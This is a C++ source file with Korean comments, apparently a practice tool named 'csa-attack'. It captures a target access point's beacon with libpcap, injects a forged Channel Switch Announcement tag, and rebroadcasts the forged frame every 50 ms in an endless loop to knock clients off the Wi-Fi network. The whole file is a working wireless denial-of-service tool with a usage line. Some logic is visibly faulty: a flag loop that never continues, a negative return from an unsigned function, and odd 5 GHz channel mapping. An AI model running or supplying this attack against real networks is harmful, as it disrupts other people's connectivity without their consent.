#include "struct.h"
#include <iostream>
#include <pcap.h>
#include <sstream>
#include <string>
#include <array>
#include <cstdlib>
#include <cstring>
#include <vector>
#include <thread>
#include <chrono>

std::array<uint8_t, 6> mac_parser(std::string& string_mac){
    std::array<uint8_t, 6> byte_mac = {};
    std::istringstream stream(string_mac);
    std::string byte_string;

    for (int i = 0; i < 6; ++i) {
        std::getline(stream, byte_string, ':');
        byte_mac[i] = static_cast<uint8_t>(std::stoi(byte_string, nullptr, 16));
    }

    return byte_mac;
}

// present flag가 끝나는 위치를 찾는 함수
uint8_t find_channel(const u_char *packet, uint32_t first_present){
    uint8_t channel;
    int offset = 8; // 첫번째 present flag 끝나는 위치
    if ((first_present >> 31) & 1){
        while(true){
            uint32_t current_present = *(uint32_t *)(packet + offset);
            offset += 4;
            if (!((current_present >> 31) & 0)){
                break;
            }
        }
    }

    if (first_present & 1){ // TSFT flag가 1인 경우
            offset += 6;
        }
        if ((first_present >> 1) & 1){ // Flags flag가 1인 경우
            offset += 1;
        }
        if ((first_present >> 2) & 1){ // Rate flag가 1인 경우
            offset += 1;
        }
        if ((first_present >> 3) & 1){ // Channel flag가 1인 경우
            uint16_t channel_frequency = *(uint16_t *)(packet + offset);
            offset += 2;
            uint16_t channel_flag = *(uint16_t *)(packet + offset);
            // 대역 확인 후 채널 저장
            if ((channel_flag >> 7) & 1){ // 2.4ghz
                channel = (((channel_frequency - 2407) / 5) + 7) % 14;
            }
            else if ((channel_flag >> 8) & 1){ // 5ghz
                channel = (channel_frequency - 5000) / 5;
                if (channel>99){
                    channel = 40;
                }
                else{
                    channel = 160;
                }
            }
            else{// 나오면 안되는 것
                return -1;
            }
        }
    return channel;
}

void run_csa_attack(pcap_t* pcap, std::array<uint8_t, 6> ap_mac, std::array<uint8_t, 6> st_mac = broadcast_byte){
    struct pcap_pkthdr *header;
    const u_char *packet;
    int d_address_offset;
    int csa_tag_offset;
    struct csa_tag csa_tag = {};
    // beacon frame capture
    while(true){
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res <= 0) break;
        radiotap_header *rthdr = (struct radiotap_header *)packet;
        uint16_t packet_type = *(uint16_t *)(packet + rthdr->len);
        if (ntohs(packet_type) == 0x8000){
            // channel 확인
            std::array<uint8_t, 6> bssid;
            std::memcpy(bssid.data(), packet + rthdr->len + 16, 6);
            if (bssid == ap_mac){
                csa_tag.new_channel = find_channel(packet, rthdr->present);
                int current_tag_offset = rthdr->len + 36;
                // csa_tag 넣을 위치 찾기
                while(true){
                    uint8_t tag_number = *(packet + current_tag_offset);
                    uint8_t tag_len = *(packet + current_tag_offset + 1);
                    if (tag_number>25){
                        csa_tag_offset = current_tag_offset;
                        break;
                    }
                    else{
                        current_tag_offset += (2 + tag_len);
                    }
                }
                d_address_offset = rthdr->len + 4;
                break;
            }
        }
        else{
            continue;
        }
    }
    // csa attack packet으로 재조립
    std::vector<u_char> attack_packet(packet, packet + header->len);
    if(st_mac != broadcast_byte){
        std::copy(st_mac.begin(), st_mac.end(), attack_packet.begin() + d_address_offset);
    }
    auto it = attack_packet.begin()+csa_tag_offset;
    u_char* csa_tag_byte = reinterpret_cast<u_char*>(&csa_tag);
    size_t tag_size = sizeof(csa_tag);
    attack_packet.insert(it, csa_tag_byte, csa_tag_byte + tag_size);
    while(true){
        printf("send\n");
        pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(attack_packet.data()), attack_packet.size());
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}




int main(int argc, char* argv[]){
    if (argc < 3) {
        std::cerr << "Usage: csa-attack <interface> <ap mac> [<station mac>]\n";
        return -1;
    }
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(argv[1],BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL) {
        std::cerr << "pcap_open_live(" << argv[0] << ") return null - " << errbuf << std::endl;
        return -1;
    }
    if (argc == 3){
        std::string ap_mac_string = argv[2];
        std::array<uint8_t, 6> ap_mac = mac_parser(ap_mac_string);
        run_csa_attack(pcap, ap_mac);
    }
    else if (argc == 4){
        std::string ap_mac_string = argv[2];
        std::string st_mac_string = argv[3];
        std::array<uint8_t, 6> ap_mac = mac_parser(ap_mac_string);
        std::array<uint8_t, 6> st_mac = mac_parser(st_mac_string);
        run_csa_attack(pcap, ap_mac, st_mac);
    }
    else{
        std::cerr << "Usage: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
        return 1;
    }


    return 0;
}